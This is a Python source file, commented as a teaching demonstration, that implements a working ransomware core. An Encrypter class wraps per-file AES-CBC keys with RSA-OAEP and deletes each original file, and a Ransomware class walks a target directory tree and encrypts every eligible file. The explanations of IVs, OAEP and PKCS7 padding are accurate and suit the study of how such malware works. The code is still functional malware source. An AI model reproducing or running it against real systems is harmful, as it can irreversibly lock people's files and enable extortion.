import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
import struct


class Encrypter:
    """
    Demonstrates a hybrid encryption scheme — the same approach real ransomware
    and many secure file transfer tools use.

    WHY HYBRID ENCRYPTION?
    - Asymmetric encryption (RSA) is slow and can only encrypt small amounts of data
    - Symmetric encryption (AES) is fast but requires both sides to share the same key
    - Hybrid encryption gets the best of both: AES encrypts the file data (fast),
      RSA encrypts the AES key (secure key exchange without sharing a secret upfront)

    FLOW OVERVIEW:
      1. Generate a random AES key + IV for each file
      2. Encrypt the file contents with AES-CBC (fast, handles large data)
      3. Encrypt the AES key + IV with RSA-OAEP (protects the symmetric key)
      4. Store everything together in one .enc file
    """

    def __init__(self, pub_key):
        # The public key is used to encrypt AES keys — anyone can encrypt,
        # but only the holder of the matching private key can decrypt.
        # This is the core of asymmetric (public-key) cryptography.
        self.public_key = pub_key

    def encrypt(self, in_file: str, out_file: str):
        # ── Step 1: Generate a fresh AES key and IV for this file ────────────
        #
        # WHAT IS AN IV?
        # IV stands for Initialisation Vector. It's a random value that gets fed
        # into the cipher alongside the key to ensure that encrypting the same
        # plaintext twice produces different ciphertext each time.
        #
        # WHY DO WE NEED IT?
        # Imagine encrypting the string "HELLO" with just a key:
        #   encrypt("HELLO", key) → always produces the same output
        #
        # An attacker who intercepts two messages can now tell when the same
        # plaintext was sent twice, even without breaking the encryption. This is
        # an information leak — the ciphertext itself reveals something about the
        # plaintext.
        #
        # With an IV:
        #   encrypt("HELLO", key, iv1) → 0x3f9a...
        #   encrypt("HELLO", key, iv2) → 0xc821...  ← completely different
        #
        # HOW CBC USES THE IV:
        # In CBC (Cipher Block Chaining) mode, each plaintext block is XORed with
        # the previous ciphertext block before being encrypted. The IV acts as the
        # "previous block" for the very first block, since there's no real previous
        # block yet.
        #
        #   Block 1: encrypt(plaintext_1 XOR iv)              → ciphertext_1
        #   Block 2: encrypt(plaintext_2 XOR ciphertext_1)    → ciphertext_2
        #   Block 3: encrypt(plaintext_3 XOR ciphertext_2)    → ciphertext_3
        #   ...and so on
        #
        # This chaining means a change anywhere in the file cascades through every
        # subsequent block — you can't swap blocks around or insert data undetected.
        #
        # DOES THE IV NEED TO BE SECRET?
        # No — the IV is stored in plaintext at the start of the encrypted file.
        # Security comes from it being RANDOM and UNIQUE, not from it being hidden.
        # Reusing the same IV with the same key is a serious vulnerability — an
        # attacker can XOR two ciphertexts together to cancel out the key and
        # recover information about both plaintexts. This is why we generate a
        # fresh IV per file with os.urandom(), which pulls from the OS's
        # cryptographically secure random source.
        #
        # KEY vs IV SUMMARY:
        #   Key  — must be kept SECRET, can be reused across files
        #          (we protect it by encrypting it with RSA)
        #   IV   — can be PUBLIC, must NEVER be reused with the same key
        #
        aes_key = os.urandom(32)   # 32 bytes = 256-bit AES key
        aes_iv  = os.urandom(16)   # 16 bytes = 128-bit IV (must match AES block size)

        # ── Step 2: Protect the AES key and IV using RSA-OAEP ────────────────
        #
        # We encrypt the AES key and IV with the RSA public key so only the
        # private key holder can ever recover them.
        #
        # OAEP (Optimal Asymmetric Encryption Padding) is the modern, secure
        # padding scheme for RSA. It adds randomness and structure to the plaintext
        # before encryption, preventing several classical attacks against RSA.
        # Never use raw/textbook RSA without padding — it is insecure.
        #
        # SHA-256 is used as both the main hash and the MGF1 (Mask Generation
        # Function) hash. MGF1 is a way of stretching a hash output to an
        # arbitrary length, used internally by OAEP to build the padding mask.
        #
        # RSA-2048 can encrypt at most ~190 bytes at a time with OAEP/SHA-256.
        # Our AES key (32 bytes) and IV (16 bytes) are both well within that limit.
        encrypted_aes_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        encrypted_aes_iv = self.public_key.encrypt(
            aes_iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        # ── Step 3: Write the encrypted file ─────────────────────────────────
        #
        # The output file uses an "envelope" format — all the information needed
        # to decrypt is bundled with the encrypted data:
        #
        #   [ 4 bytes       : length of encrypted AES key (little-endian uint32) ]
        #   [ N bytes       : RSA-encrypted AES key                               ]
        #   [ 256 bytes     : RSA-encrypted AES IV                                ]
        #   [ remainder     : AES-CBC encrypted file contents                     ]
        #
        # Storing the key length first lets the decryptor know exactly how many
        # bytes to read for the key, regardless of the RSA key size used.
        # struct.pack("<I", n) encodes n as a 4-byte little-endian unsigned int.
        with open(out_file, "wb") as output:
            output.write(struct.pack("<I", len(encrypted_aes_key)))
            output.write(encrypted_aes_key)
            output.write(encrypted_aes_iv)

            # ── Step 4: Encrypt file contents with AES-CBC ────────────────────
            #
            # AES (Advanced Encryption Standard) is a symmetric block cipher —
            # it operates on fixed-size 128-bit (16 byte) blocks of data at a time.
            # CBC mode chains those blocks together using the IV as described above.
            cipher = Cipher(
                algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend()
            )
            encryptor = cipher.encryptor()

            # PKCS7 PADDING:
            # AES-CBC requires input to be an exact multiple of the block size
            # (16 bytes). Real files are rarely a perfect multiple, so we use
            # PKCS7 padding to extend the final block.
            #
            # PKCS7 padding works by appending N bytes, each with the value N:
            #   If 3 bytes of padding are needed → append 0x03 0x03 0x03
            #   If 1 byte  of padding is needed  → append 0x01
            #   If 0 bytes of padding are needed → append a full block of 0x10
            #     (a full padding block is always added so the decryptor can
            #      unambiguously strip padding without mis-reading real data)
            padder = sym_padding.PKCS7(128).padder()

            # Process in 64KB chunks rather than loading the whole file into memory.
            # This keeps memory usage flat regardless of file size — important for
            # large files like videos or databases.
            # The walrus operator (:=) reads and assigns in a single expression,
            # looping until read() returns empty bytes (end of file).
            with open(in_file, "rb") as inp:
                while chunk := inp.read(65536):
                    output.write(encryptor.update(padder.update(chunk)))

            # Flush the padder first — this produces the final padded block.
            # Then flush the encryptor — this processes any data still in its buffer.
            # Order matters: pad before encrypt, always.
            output.write(encryptor.update(padder.finalize()))
            output.write(encryptor.finalize())

        # Remove the original plaintext — only the .enc version remains on disk.
        # At this point the file is unrecoverable without the private key.
        os.remove(in_file)

    def decrypt(self, input_path: str, output_path: str, private_key):
        with open(input_path, "rb") as inp:
            # ── Step 1: Read the envelope header ─────────────────────────────
            #
            # Re-read the key length stored during encryption. struct.unpack
            # returns a tuple even for a single value, so we index [0].
            key_len = struct.unpack("<I", inp.read(4))[0]
            encrypted_aes_key = inp.read(key_len)
            encrypted_aes_iv  = inp.read(256)   # RSA-2048 always outputs 256 bytes

            # ── Step 2: Recover the AES key and IV using the private key ──────
            #
            # The private key is the mathematical inverse of the public key.
            # RSA-OAEP decryption unwraps the AES key and IV, giving us back
            # the exact random bytes that were generated during encryption.
            #
            # This is the critical step — without the private key, the AES key
            # is unrecoverable and the file contents cannot be decrypted.
            # The security of the whole scheme rests on keeping the private key secret.
            aes_key = private_key.decrypt(
                encrypted_aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
            aes_iv = private_key.decrypt(
                encrypted_aes_iv,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )

            # ── Step 3: Rebuild the AES-CBC cipher and decrypt ────────────────
            #
            # Exact same parameters as encryption — AES-CBC is fully reversible
            # given the same key and IV. The decryptor runs the block cipher in
            # reverse, then XORs each output block with the previous ciphertext
            # block (or the IV for the first block) to recover the original plaintext.
            cipher = Cipher(
                algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend()
            )
            decryptor = cipher.decryptor()

            # The unpadder strips the PKCS7 padding that was added during encryption,
            # recovering the exact original byte length of the file.
            # It must be applied after decryption, not before.
            unpadder = sym_padding.PKCS7(128).unpadder()

            with open(output_path, "wb") as output:
                while chunk := inp.read(65536):
                    output.write(unpadder.update(decryptor.update(chunk)))

                # Finalize: flush the decryptor's internal buffer (handles the last
                # partial block), then strip the PKCS7 padding to get the exact
                # original file contents back.
                output.write(unpadder.update(decryptor.finalize()))
                output.write(unpadder.finalize())

        # Remove the .enc file — only the restored plaintext remains.
        # Encrypter.decrypt handles this internally, so Ransomware.decrypt_files
        # should NOT also call os.remove() or it will get a FileNotFoundError.
        os.remove(input_path)


class Ransomware:
    """
    Walks a directory tree and applies the Encrypter to every eligible file.
    Demonstrates how ransomware targets files broadly rather than selectively,
    and how the same code handles both encryption and decryption passes.
    """

    def __init__(self, target_dir, encrypter):
        self.target_dir = target_dir   # root directory to walk
        self.encrypter  = encrypter    # Encrypter instance holding the public key

    def encrypt_files(self):
        # os.path.abspath(__file__) resolves the full path of this script file.
        # We use it to skip our own directory so the script doesn't encrypt itself.
        exe_dir = os.path.dirname(os.path.abspath(__file__))

        # os.walk yields a (root, subdirectories, files) tuple for every directory
        # in the tree, recursively. This is how we reach files in nested folders
        # without writing our own recursion.
        for root, dirs, files in os.walk(self.target_dir):

            # Safety guard: skip the project directory entirely.
            # Setting dirs.clear() tells os.walk not to descend into any
            # subdirectories of this path either — it prunes the whole subtree.
            if "GalenRansom" in root:
                dirs.clear()
                continue

            for file in files:
                file_path = os.path.join(root, file)

                # Skip already-encrypted files so re-running is safe (idempotent).
                if file_path.endswith(".enc"):
                    continue

                # Skip files that live in the same directory as this script.
                if os.path.dirname(file_path) == exe_dir:
                    continue

                try:
                    # Encrypt in place: original file is replaced by file.enc
                    self.encrypter.encrypt(file_path, file_path + ".enc")
                except PermissionError as ex:
                    print(f"Skipping {file_path} - no permission: {ex}")
                except OSError as ex:
                    print(f"Skipping {file_path} - in use or IO error: {ex}")
                except Exception as ex:
                    print(f"Skipping {file_path} - error: {ex}")

    def decrypt_files(self, start_path: str, private_key):
        exe_dir = os.path.dirname(os.path.abspath(__file__))

        for root, dirs, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)

                # Only process .enc files — skip anything that wasn't encrypted
                if not file_path.endswith(".enc"):
                    continue

                if os.path.dirname(file_path) == exe_dir:
                    continue

                # Reconstruct the original filename by stripping the .enc suffix
                output_path = file_path.replace(".enc", "")

                try:
                    self.encrypter.decrypt(file_path, output_path, private_key)
                except PermissionError as ex:
                    print(f"Skipping {file_path} - no permission: {ex}")
                except OSError as ex:
                    print(f"Skipping {file_path} - in use or IO error: {ex}")
                except Exception as ex:
                    print(f"Skipping {file_path} - error: {ex}")